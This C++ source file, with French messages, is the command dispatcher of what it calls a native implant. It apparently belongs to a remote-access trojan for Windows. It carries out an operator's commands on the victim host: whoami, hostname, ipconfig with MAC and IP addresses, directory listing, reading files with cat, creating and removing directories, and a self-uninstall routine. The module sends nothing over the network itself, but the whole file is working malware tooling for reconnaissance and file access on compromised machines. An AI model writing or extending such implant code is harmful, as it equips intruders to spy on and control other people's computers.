#define _CRT_SECURE_NO_WARNINGS

#include "commands.h"
#include <iostream>
#include <string>
#include <vector>
#include <cstdio>
#include <windows.h>
#include <iphlpapi.h>
#include <cleaner.h>

#pragma comment(lib, "iphlpapi.lib")

std::string static cmd_pwd() {
	char buffer[MAX_PATH];
	if (GetCurrentDirectoryA(MAX_PATH, buffer) == 0) {
		return "Erreur : impossible de récupérer le répertoire courant.";
	}
	return std::string(buffer);
}

std::string static cmd_dir(const std::string& path) {
	std::string search_path = path.empty() ? "*" : path + "\\*";
	std::string result = "Repertoire de " + cmd_pwd() + "\n\n";

	WIN32_FIND_DATAA find_data;
	HANDLE hFind = FindFirstFileA(search_path.c_str(), &find_data);

	if (hFind == INVALID_HANDLE_VALUE) {
		return "Impossible de lister le repertoire (chemin introuvable ou acces refuse).";
	}

	do {
		// On ignore les entrées spéciales . et ..
		if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0)
			continue;

		if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			result += "<DIR>          ";
		}
		else {
			char size_buf[32];
			snprintf(size_buf, sizeof(size_buf), "%15llu ", (unsigned long long)find_data.nFileSizeLow);
			result += size_buf;
		}

		result += std::string(find_data.cFileName) + "\n";

	} while (FindNextFileA(hFind, &find_data) != 0);

	FindClose(hFind);
	return result;
}

std::string static cmd_cd(const std::string& path) {
	if (SetCurrentDirectoryA(path.c_str()) == 0) {
		return "Erreur : impossible de changer de répertoire.";
	}
	return "Répertoire changé avec succès.";
}

std::string static cmd_whoami() {
	char buffer[256];
	DWORD size = sizeof(buffer);
	if (GetUserNameA(buffer, &size) == 0) {
		return "Erreur : impossible de récupérer le nom d'utilisateur.";
	}
	return std::string(buffer);
}

std::string static cmd_hostname() {
	char buffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size = sizeof(buffer);
	if (GetComputerNameA(buffer, &size) == 0) {
		return "Erreur : impossible de récupérer le nom de l'ordinateur.";
	}
	return std::string(buffer);
}

std::string static cmd_ipconfig() {
	std::string result;
	ULONG outBufLen = sizeof(IP_ADAPTER_INFO);
	PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(outBufLen);

	if (GetAdaptersInfo(pAdapterInfo, &outBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)malloc(outBufLen);
	}

	if (GetAdaptersInfo(pAdapterInfo, &outBufLen) == NO_ERROR) {
		PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
		while (pAdapter) {
			result += "Carte reseau : " + std::string(pAdapter->Description) + "\n";

			// Adresse MAC
			result += "  Adresse physique : ";
			for (UINT i = 0; i < pAdapter->AddressLength; i++) {
				char buf[4];
				snprintf(buf, sizeof(buf), "%02X", (int)pAdapter->Address[i]);
				result += std::string(buf);
				if (i < pAdapter->AddressLength - 1) result += "-";
			}
			result += "\n";

			// Adresse IP
			PIP_ADDR_STRING pIpAddr = &pAdapter->IpAddressList;
			while (pIpAddr) {
				result += "  Adresse IP : " + std::string(pIpAddr->IpAddress.String) + "\n";
				pIpAddr = pIpAddr->Next;
			}
			result += "\n";
			pAdapter = pAdapter->Next;
		}
	}
	else {
		result = "Erreur : impossible de recuperer les infos reseau.";
	}

	free(pAdapterInfo);
	return result;
}

std::string static cmd_mkdir(const std::string& dir_name) {
	if (CreateDirectoryA(dir_name.c_str(), NULL) == 0) {
		return "Erreur : impossible de créer le répertoire.";
	}
	return "Répertoire créé avec succès.";
}

std::string static cmd_rmdir(const std::string& dir_name) {
	if (RemoveDirectoryA(dir_name.c_str()) == 0) {
		return "Erreur : impossible de supprimer le répertoire.";
	}
	return "Répertoire supprimé avec succès.";
}

std::string static cmd_cat(const std::string& file_name) {
	FILE* file = fopen(file_name.c_str(), "r");
	if (!file) {
		return "Erreur : impossible d'ouvrir le fichier.";
	}
	std::string result;
	char buffer[4096];
	while (fgets(buffer, sizeof(buffer), file) != nullptr) {
		result += buffer;
	}
	fclose(file);
	return result.empty() ? "Fichier vide." : result;
}

std::string execute_command(const std::string& command) {
	std::string cmd_name = command;
	std::string cmd_args = "";

	size_t space_pos = command.find(' ');
	if (space_pos != std::string::npos) {
		cmd_name = command.substr(0, space_pos);
		cmd_args = command.substr(space_pos + 1);
	}

	if (cmd_name == "pwd")      return cmd_pwd();
	if (cmd_name == "cd")       return cmd_cd(cmd_args);
	if (cmd_name == "whoami")   return cmd_whoami();
	if (cmd_name == "hostname") return cmd_hostname();
	if (cmd_name == "dir" || cmd_name == "ls") return cmd_dir(cmd_args);
	if (cmd_name == "cat" || cmd_name == "type") return cmd_cat(cmd_args);
	if (cmd_name == "mkdir")    return cmd_mkdir(cmd_args);
	if (cmd_name == "rmdir")    return cmd_rmdir(cmd_args);
	if (cmd_name == "ipconfig") return cmd_ipconfig();
	if (cmd_name == "uninstall") return cmd_uninstall();

	return "Commande non supportee par l'implant natif : " + cmd_name;
}